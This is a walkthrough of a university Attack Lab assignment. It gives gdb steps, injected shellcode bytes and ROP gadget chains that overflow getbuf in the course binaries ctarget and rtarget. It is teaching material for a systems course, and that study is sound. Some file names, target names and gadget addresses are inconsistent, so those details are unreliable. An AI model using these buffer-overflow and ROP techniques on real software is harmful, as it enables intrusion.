# Attack Lab

* [File Introduction](#file)
* [Commands](#commands)
* [Part I: Code Injection Attacks](#part1)
  * [phase 1](#phase1)
  * [phase 2](#phase2)
  * [phase 3](#phase3)
* [Part II: Return-Oriented Programming](#part2)
  * [phase 4](#phase4)
  * [phase 5](#phase5)

<h2 id = "file">File introduction</h2>
README.txt: A file describing the contents of the directory

ctarget: An executable program vulnerable to code-injection attacks

rtarget: An executable program vulnerable to return-oriented-programming attacks

cookie.txt: An 8-digit hex code that you will use as a unique identifier in your attacks.

farm.c: The source code of your target’s “gadget farm,” which you will use in generating return-oriented
	     programming attacks.

hex2raw: A utility to generate attack strings.

```c
unsigned getbuf(){
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

Functions Gets() and gets() have no way to determine whether their destination buffers are large
enough to store the string they read. They simply copy sequences of bytes, possibly overrunning the bounds of the storage allocated at the destinations.

The exploit string must not contain byte value 0x0a at any intermediate position, since this is the
ASCII code for newline (‘\n’). When Gets encounters this byte, it will assume you intended to
terminate the string.

HEX2RAW expects two-digit hex values separated by one or more white spaces. So if you want to
create a byte with a hex value of 0, you need to write it as 00. To create the word 0xdeadbeef
you should pass “ef be ad de” to HEX2RAW (note the reversal required for little-endian byte
ordering).

<h2 id = "commands">Commands</h2>
#### Using HEX2RAW

```shell
unix> ./hex2raw < exploit.txt > exploit-raw.txt          # store the raw string in a file
```

#### Using GDB

```
unix> gdb ctarget                                        # use gdb to run ctarget
(gdb) run < exploit-raw.txt -q                           # add -q to run locally
(gdb) print <variable>                                   # print the value of the variable
(gdb) break *<addr>                                      # set break point
(gdb) x/<n/f/u> <addr>                                   # print the value stored at the address
```

More usages can be found in [gdb-ref](../gdb-ref.md)

#### Generating byte codes

```shell
unix> gcc -c example.s
unix> objdump -d example.o
```

<h2 id = "part1">Part I: Code Injection Attacks</h2>
>For the first three phases, your exploit strings will attack CTARGET. This program is set up in a way that
>the stack positions will be consistent from one run to the next and so that data on the stack can be treated as executable code. These features make the program vulnerable to attacks where the exploit strings contain the byte encodings of executable code.

<h3 id = "phase1">Phase 1</h3>
Function getbuf is called within CTARGET by a function test having the following C code:

```c
void test(){
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

When getbuf executes its return statement (line 5 of getbuf), the program ordinarily resumes execution
within function test (at line 5 of this function). We want to change this behavior. Within the file ctarget,
there is code for a function touch1 having the following C representation:

```c
void touch1(){
    vlevel = 1; /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```

Our task is to get CTARGET to execute the code for touch1 when getbuf executes its return statement, rather than returning to test. We can overflow the stack with the exploit string and change the return address of getbuf function to the address of touch1 function. 

Run ctarget executable in gdb and set a breakpoint at getbuf 

```shell
gdb ctarget
(gdb) break getbuf
(gdb) run -q         # -q: Don’t send results to the server
```

Then disasemble the getbuf function 

```
(gdb) disas
```

Since the buffer size is a run time constant, we need to look at the disasembled code to figure it out. 

```
Dump of assembler code for function getbuf:
=> 0x000055555555594f <+0>:	sub    $0x18,%rsp
   0x0000555555555953 <+4>:	mov    %rsp,%rdi
   0x0000555555555956 <+7>:	callq  0x555555555b9f <Gets>
   0x000055555555595b <+12>:	mov    $0x1,%eax
   0x0000555555555960 <+17>:	add    $0x18,%rsp
   0x0000555555555964 <+21>:	retq   
End of assembler dump.
```

The code ` sub $0x18,%rsp`  indicates that 24(0x18) bytes of buffer is allocated for getbuf. So we need to input 24 bytes of padding followed by the return address of the touch1. 

To find the address the touch1, we need to get the disassembled code.

```
(gdb) disassemble touch1
```

 Then we get codes which looked like

```
Dump of assembler code for function touch1:
   0x0000555555555965 <+0>:	sub    $0x8,%rsp
   0x0000555555555969 <+4>:	movl   $0x1,0x202b69(%rip)        # 0x5555557584dc <vlevel>
   0x0000555555555973 <+14>:	lea    0x178d(%rip),%rdi        # 0x555555557107
   0x000055555555597a <+21>:	callq  0x555555554de0 <puts@plt>
   0x000055555555597f <+26>:	mov    $0x1,%edi
   0x0000555555555984 <+31>:	callq  0x555555555db6 <validate>
   0x0000555555555989 <+36>:	mov    $0x0,%edi
   0x000055555555598e <+41>:	callq  0x555555554f60 <exit@plt>
End of assembler dump.
```

So it's address is at `0x555555555965` 

We can also use `p touch1`  to get its address

```
(gdb) p touch
$1 = {void ()} 0x555555555965 <touch1>
```

Finally create a text file named atk1.txt which will look like below

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00    /* */
00 00 00 00 00 00 00 00    /* the first 24 padding bytes */
65 59 55 55 55 55 00 00    /* address of touch1 */
```

When writing the bytes, we need to consider the byte order. My system is a little-endian so the bytes go in reverse order.  

Now run this file through the program hex2raw, which  generates raw exploit strings , and run the raw file

```shell
./hex2raw < atk1.txt > atk1r.txt

./ctarget < atk1r.txt             # use I/O redirection

gdb ctarget                 # within GDB
(gdb) run < atk1r.txt
```

We can get something like below if our solution is right

```shell
Cookie: 0x5f5bd74e                # your cookie will be different
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

<h3 id = "phase2">Phase 2</h3>
Phase 2 involves injecting a small amount of code as part of your exploit string.
Within the file ctarget there is code for a function touch2 having the following C representation:

```c
void touch2(unsigned val){
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

Our task is to get CTARGET to execute the code for touch2 rather than returning to test. In this case,
however, we must make it appear to touch2 as if we have passed your cookie as its argument.

As what we did in phase1, we need to run ctarget executable in gdb and set a breakpoint at getbuf and get the disassembled code of touch2

```
(gdb) disassemble touch2
Dump of assembler code for function touch2:
   0x0000555555555993 <+0>:	sub    $0x8,%rsp
   0x0000555555555997 <+4>:	mov    %edi,%esi
   0x0000555555555999 <+6>:	movl   $0x2,0x202b39(%rip)        # 0x5555557584dc <vlevel>
   0x00005555555559a3 <+16>:	cmp    %edi,0x202b3b(%rip)        # 0x5555557584e4 <cookie>
   0x00005555555559a9 <+22>:	je     0x5555555559d0 <touch2+61>
   0x00005555555559ab <+24>:	lea    0x17a6(%rip),%rdi        # 0x555555557158
   0x00005555555559b2 <+31>:	mov    $0x0,%eax
   0x00005555555559b7 <+36>:	callq  0x555555554e10 <printf@plt>
   0x00005555555559bc <+41>:	mov    $0x2,%edi
   0x00005555555559c1 <+46>:	callq  0x555555555e74 <fail>
   0x00005555555559c6 <+51>:	mov    $0x0,%edi
   0x00005555555559cb <+56>:	callq  0x555555554f60 <exit@plt>
   0x00005555555559d0 <+61>:	lea    0x1759(%rip),%rdi        # 0x555555557130
   0x00005555555559d7 <+68>:	mov    $0x0,%eax
   0x00005555555559dc <+73>:	callq  0x555555554e10 <printf@plt>
   0x00005555555559e1 <+78>:	mov    $0x2,%edi
   0x00005555555559e6 <+83>:	callq  0x555555555db6 <validate>
   0x00005555555559eb <+88>:	jmp    0x5555555559c6 <touch2+51>
End of assembler dump.
```

Our goal is to modify the %rdi register and store the cookie in it. We need some assembly code for the task.

Create a file called atk2.s and write the code below with your own cookie

```
movq $0x5f5bd74e,%rdi           /* move the cookie into register %rdi */
retq                             /* return */
```

Now we need the byte representation of the code above. Compile it with gcc then dissasemble it

```shell
gcc -c atk2.s
objdump -d atk2.o
```

 Then we get codes like below

```
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 4e d7 5b 5f 	mov    $0x5f5bd74e,%rdi
   7:	c3                   	retq  
```

In order to execute our code, we need to find the address of %rsp(the start address of our input) and replace the address in the return statement with it. We can use GDB to find the address of %rsp 

```
gdb ctarget
(gdb) break getbuf
(gdb) run -q
```

Now do `disas` and we can get

```
Dump of assembler code for function getbuf:
=> 0x000055555555594f <+0>:	sub    $0x18,%rsp
   0x0000555555555953 <+4>:	mov    %rsp,%rdi
   0x0000555555555956 <+7>:	callq  0x555555555b9f <Gets>
   0x000055555555595b <+12>:	mov    $0x1,%eax
   0x0000555555555960 <+17>:	add    $0x18,%rsp
   0x0000555555555964 <+21>:	retq   
End of assembler dump.
```

We need to run the code until the instruction just below `callq  0x555555555b9f <Gets>` . Use `until *addr`

```
until *0x000055555555595b
```

It will ask to type a string.  Type a random string and do `x/s $rsp`, then get something like 

```
(gdb) x/s $rsp
0x5566fce8:	"asdasd"             # the random string I typed
```

 `0x5566fce8` is the address of register %rsp.

Get the address of touch 2

```
(gdb) p touch2
$1 = {void (unsigned int)} 0x555555555993 <touch2>
```

Now we can write our attack file. Create a file named atk2.txt and reverse the bytes for little-endian.

```
48 c7 c7 4e d7 5b 5f c3          /* store cookie in %rdi */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00          /* padding to fill 24 bytes */
e8 fc 66 55 00 00 00 00          /* address of register %rsp */
93 59 55 55 55 55 00 00          /* address of function touch2 */
```

 Finally run the file

```
./hex2raw < atk2.txt > atk2r.txt

./ctarget < atk2r.txt             # use I/O redirection

gdb ctarget                       # within GDB
(gdb) run < atk2r.txt
```

What the exploit does is that after we enter the string  when Gets tries to return, it is forced to point to the address in %rsp by the overflow code so it will execute codes which set our cookie as the parameter and then call touch2.

```
Cookie: 0x5f5bd74e
Type string:Touch2!: You called touch2(0x5f5bd74e)
Valid solution for level 2 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

<h3 id = "phase3">Phase 3</h3>
Within the file ctarget there is code for functions hexmatch and touch3 having the following C representations:

```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval){
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval){
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```

The task is similar to phase 2 except that we need to call touch3 and pass the address of our cookie string to %rdi.

Because the functions hexmatch and strncmp may overwrite portions of memory that held the buffer used by getbuf, the cookie string has to be stored at a safe place. We can store it after touch3.

The total bytes before the cookie are `buffer + 8 bytes for return address of rsp + 8 bytes for touch3` , that is `0x18 + 8 + 8 = 28` (40 Decimal)

In phase 2 we know %rsp points `0x5566fce8`. Add the bias `0x5566fce8 + 0x28 = 0x5566fd10`. Then we can write the code and generate the byte representation

```
movq $0x5566fd10,%rdi /* %rsp + 0x28 */
retq
```

Disassemble it

```
Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 10 fd 66 55 	mov    $0x5566fd10,%rdi
   7:	c3                   	retq   
```

Get the address of touch3

```
(gdb) p touch3
$1 = {void (char *)} 0x555555555a6e <touch3>
```

We can transfer our cookie into hex format according to ASCII table

```
man ascii
```

We can know 0x5f5bd74e → 35 66 35 62 64 37 34 65 

Now we can create atk3.txt

```
48 c7 c7 10 fd 66 55 c3         /* pass the address of cookie to %rdi */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00         /* padding */
e8 fc 66 55 00 00 00 00         /* return (%rsp) */
6e 5a 55 55 55 55 00 00         /* the address of touch3 */
35 66 35 62 64 37 34 65         /* cookie string*/
```

Generate the raw exploit string and check the answer

```
./hex2raw < atk3.txt > atk3r.txt

./ctarget < atk3r.txt             # use I/O redirection

gdb ctarget                       # within GDB
(gdb) run < atk3r.txt
```

```
Cookie: 0x5f5bd74e
Type string:Touch3!: You called touch3("5f5bd74e")
Valid solution for level 3 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

<h2 id = "part2">Part II: Return-Oriented Programming</h2>
> Performing code-injection attacks on program RTARGET is much more difficult than it is for CTARGET,
> because it uses two techniques to thwart such attacks:
>
> * It uses randomization so that the stack positions differ from one run to another. This makes it impossibleto determine where your injected code will be located.
> * It marks the section of memory holding the stack as nonexecutable, so even if you could set the program counter to the start of your injected code, the program would fail with a segmentation fault.
>
> The solution for this is to use ROP (Return Oriented Programming). What ROP does is that since we can't execute our own code, we will look for instructions in the code that do the same thing as what we want. These are called gadgets and by combining these gadgets, we will be able to perform our exploit. 

* **Encodings of movq instructions**

<table>
   <tr>
      <th rowspan="2">Source S</td>
      <th colspan="8">Destination D</td>
   </tr>
   <tr>
      <td>%rax</td>
      <td>%rcx</td>
      <td>%rdx</td>
      <td>%rbx</td>
      <td>%rsp</td>
      <td>%rbp</td>
      <td>%rsi</td>
      <td>%rdi</td>
   </tr>
   <tr>
      <td>%rax</td>
      <td>48 89 c0</td>
      <td>48 89 c1</td>
      <td>48 89 c2</td>
      <td>48 89 c3</td>
      <td>48 89 c4</td>
      <td>48 89 c5</td>
      <td>48 89 c6</td>
      <td>48 89 c7</td>
   </tr>
   <tr>
      <td>%rcx</td>
      <td>48 89 c8</td>
      <td>48 89 c9</td>
      <td>48 89 ca</td>
      <td>48 89 cb</td>
      <td>48 89 cc</td>
      <td>48 89 cd</td>
      <td>48 89 ce</td>
      <td>48 89 cf</td>
   </tr>
   <tr>
      <td>%rdx</td>
      <td>48 89 d0</td>
      <td>48 89 d1</td>
      <td>48 89 d2</td>
      <td>48 89 d3</td>
      <td>48 89 d4</td>
      <td>48 89 d5</td>
      <td>48 89 d6</td>
      <td>48 89 d7</td>
   </tr>
   <tr>
      <td>%rbx</td>
      <td>48 89 d8</td>
      <td>48 89 d9</td>
      <td>48 89 da</td>
      <td>48 89 db</td>
      <td>48 89 dc</td>
      <td>48 89 dd</td>
      <td>48 89 de</td>
      <td>48 89 df</td>
   </tr>
   <tr>
      <td>%rsp</td>
      <td>48 89 e0</td>
      <td>48 89 e1</td>
      <td>48 89 e2</td>
      <td>48 89 e3</td>
      <td>48 89 e4</td>
      <td>48 89 e5</td>
      <td>48 89 e6</td>
      <td>48 89 e7</td>
   </tr>
   <tr>
      <td>%rbp</td>
      <td>48 89 e8</td>
      <td>48 89 e9</td>
      <td>48 89 ea</td>
      <td>48 89 eb</td>
      <td>48 89 ec</td>
      <td>48 89 ed</td>
      <td>48 89 ee</td>
      <td>48 89 ef</td>
   </tr>
   <tr>
      <td>%rsi</td>
      <td>48 89 f0</td>
      <td>48 89 f1</td>
      <td>48 89 f2</td>
      <td>48 89 f3</td>
      <td>48 89 f4</td>
      <td>48 89 f5</td>
      <td>48 89 f6</td>
      <td>48 89 f7</td>
   </tr>
   <tr>
      <td>%rdi</td>
      <td>48 89 f8</td>
      <td>48 89 f9</td>
      <td>48 89 fa</td>
      <td>48 89 fb</td>
      <td>48 89 fc</td>
      <td>48 89 fd</td>
      <td>48 89 fe</td>
      <td>48 89 ff</td>
   </tr>
</table>

* **Encodings of popq instructions**

<table>
   <tr>
      <th rowspan="2">Operation</td>
      <th colspan="8">Register R</td>
   </tr>
   <tr>
      <td>%rax</td>
      <td>%rcx</td>
      <td>%rdx</td>
      <td>%rbx</td>
      <td>%rsp</td>
      <td>%rbp</td>
      <td>%rsi</td>
      <td>%rdi</td>
   </tr>
   <tr>
      <td>popq R</td>
      <td>58</td>
      <td>59</td>
      <td>5a</td>
      <td>5b</td>
      <td>5c</td>
      <td>5d</td>
      <td>5e</td>
      <td>5f</td>
   </tr>
</table>

* **Encodings of movl instructions**

<table>
   <tr>
      <th rowspan="2">Source S</td>
      <th colspan="8">Destination D</td>
   </tr>
   <tr>
      <td>%eax</td>
      <td>%ecx</td>
      <td>%edx</td>
      <td>%ebx</td>
      <td>%esp</td>
      <td>%ebp</td>
      <td>%esi</td>
      <td>%edi</td>
   </tr>
   <tr>
      <td>%eax</td>
      <td>89 c0</td>
      <td>89 c1</td>
      <td>89 c2</td>
      <td>89 c3</td>
      <td>89 c4</td>
      <td>89 c5</td>
      <td>89 c6</td>
      <td>89 c7</td>
   </tr>
   <tr>
      <td>%ecx</td>
      <td>89 c8</td>
      <td>89 c9</td>
      <td>89 ca</td>
      <td>89 cb</td>
      <td>89 cc</td>
      <td>89 cd</td>
      <td>89 ce</td>
      <td>89 cf</td>
   </tr>
   <tr>
      <td>%edx</td>
      <td>89 d0</td>
      <td>89 d1</td>
      <td>89 d2</td>
      <td>89 d3</td>
      <td>89 d4</td>
      <td>89 d5</td>
      <td>89 d6</td>
      <td>89 d7</td>
   </tr>
   <tr>
      <td>%ebx</td>
      <td>89 d8</td>
      <td>89 d9</td>
      <td>89 da</td>
      <td>89 db</td>
      <td>89 dc</td>
      <td>89 dd</td>
      <td>89 de</td>
      <td>89 df</td>
   </tr>
   <tr>
      <td>%esp</td>
      <td>89 e0</td>
      <td>89 e1</td>
      <td>89 e2</td>
      <td>89 e3</td>
      <td>89 e4</td>
      <td>89 e5</td>
      <td>89 e6</td>
      <td>89 e7</td>
   </tr>
   <tr>
      <td>%ebp</td>
      <td>89 e8</td>
      <td>89 e9</td>
      <td>89 ea</td>
      <td>89 eb</td>
      <td>89 ec</td>
      <td>89 ed</td>
      <td>89 ee</td>
      <td>89 ef</td>
   </tr>
   <tr>
      <td>%esi</td>
      <td>89 f0</td>
      <td>89 f1</td>
      <td>89 f2</td>
      <td>89 f3</td>
      <td>89 f4</td>
      <td>89 f5</td>
      <td>89 f6</td>
      <td>89 f7</td>
   </tr>
   <tr>
      <td>%edi</td>
      <td>89 f8</td>
      <td>89 f9</td>
      <td>89 fa</td>
      <td>89 fb</td>
      <td>89 fc</td>
      <td>89 fd</td>
      <td>89 fe</td>
      <td>89 ff</td>
   </tr>
</table>

* **Encodings of 2-byte functional nop instructions**

<table>
    <tr>
      <th rowspan="2">Operation</td>
      <th colspan="4">Register R</td>
   </tr>
   <tr>
      <td>%al</td>
      <td>%cl</td>
      <td>%dl</td>
      <td>%bl</td>
   </tr>
   <tr>
      <td>andb R, R</td>
      <td>20 c0</td>
      <td>20 c9</td>
      <td>20 d2</td>
      <td>20 db</td>
   </tr>
   <tr>
      <td>orb R, R</td>
      <td>08 c0</td>
      <td>08 c9</td>
      <td>08 d2</td>
      <td>08 db</td>
   </tr>
   <tr>
      <td>cmpb R, R</td>
      <td>38 c0</td>
      <td>38 c9</td>
      <td>38 d2</td>
      <td>38 db</td>
   </tr>
   <tr>
      <td>testb R, R</td>
      <td>84 c0</td>
      <td>84 c9</td>
      <td>84 d2</td>
      <td>84 db</td>
   </tr>
</table>

<h3 id = "phase4">Phase 4</h3>
This phase is the same as phase 2 except using different method to call touch2 and pass the cookie. 

All the gadgets we need should be found in the region of the code for rtarget demarcated by the
functions start_farm and mid_farm. Only two gadgets can be used to do the attack. 

First we need to find bytes to pass the cookie to %rdi. Because `5f` which represent `popq %rdi` cannot be found between start_farm and end_farm in the dump file, we use `popq %rax` for a substitute and pass it to %rdi after that. So our code can be

```
popq     %rax
ret                  
mov      %rax,%rdi
ret
```

In the disassembled code of `rtatget` we can find `58 (90) c3` at 0x1b23 which represent `popq %rax` and `ret` as gadget 1

> The code in the () can be ignored because it represents `nop` and has no influence on the rest codes.
>
> When running the program in my computer the address will become 0x0000555555555b23 .

```
0000000000001b0f <setval_119>:      /* when running the program the address will be 0x0000555555555b0f */
    1b0f:	c7 07 2e c6 58 90    	movl   $0x9058c62e,(%rdi)
    1b15:	c3                   	retq   
```

and `48 89 c7 c3` at 0x1b2c which represent `mov %rax,%rdi` and `ret`  as gadget 2

> The transition of address is similar to notes above

```
0000000000001b29 <addval_186>:
    1b29:	8d 87 e3 48 89 c7    	lea    -0x3876b71d(%rdi),%eax
    1b2f:	c3                   	retq 
```

Now we can use these 2 gabgets to create our file `atk5.txt`

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00            /* padding */
13 5b 55 55 55 55 00 00            /* gadget 1 address */
4e d7 5b 5f 00 00 00 00            /* cookie popped into %rax */
24 5b 55 55 55 55 00 00            /* gadget 2 address */
93 59 55 55 55 55 00 00            /* touch2 address */
```

Let's check our solution

```
./hex2raw < atk4.txt > atk4r.txt

./ctarget < atk4r.txt             # use I/O redirection

gdb ctarget                       # within GDB
(gdb) run < atk4r.txt
```

```
Cookie: 0x5f5bd74e
Type string:Touch2!: You called touch2(0x5f5bd74e)
Valid solution for level 2 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

<h3 id = "phase5">Phase 5</h3>
This phase is similar to the combination of phase 3 and phase 4 except we are required 8 gadgets (not all of which are unique). We need to pass the address stored in %rsp to %rdi first, and set the value of %rax as the offset of the address of our cookie string in the stack. Then copy it to %esi. The sum of %rdi and %rsi will be the address that stores the cookie string.

The file can be create according to codes below

```
mov   %rsp,%rax
ret
mov   %rax,%rdi
ret
popq  %rax         
ret                 
movl  %eax,%edx
ret
movl  %edx,%ecx
ret
movl  %ecx,%esi
ret
lea   (%rdi,%rsi,1),%rax
ret
mov   %rax,%rdi
ret
```

The order of passing value between registers can be adjust according to the disasembled code of  your own file `rtarget` 

When doing the first command, %rsp will point to the address of the next command in the stack. And the rest commands will not change the value of %rsp.

Therefore the offset of the address of cookie string is 0x48 because there are 9 commands (0x48 bits) between the first command and the cookie string.

Now we can create atk5.txt like codes below

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00                  /* padding */
fb 5b 55 55 55 55 00 00			 /* use gadget 1 address to rewrite the return address*/
24 5b 55 55 55 55 00 00			 /* gadget 2 address */
13 5b 55 55 55 55 00 00			 /* gadget 3 address */
48 00 00 00 00 00 00 00			 /* offset of the cookie string */
8f 5b 55 55 55 55 00 00			 /* gadget 4 address */
cb 5b 55 55 55 55 00 00			 /* gadget 5 address */
f5 5b 55 55 55 55 00 00			 /* gadget 6 address */
3d 5b 55 55 55 55 00 00			 /* gadget 7 address */
24 5b 55 55 55 55 00 00			 /* gadget 8 address */
6e 5a 55 55 55 55 00 00			 /* touch3 address */
35 66 35 62 64 37 34 65			 /* cookie string */
```

The final result

```
Cookie: 0x5f5bd74e
Type string:Touch3!: You called touch3("5f5bd74e")
Valid solution for level 3 with target rtarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```

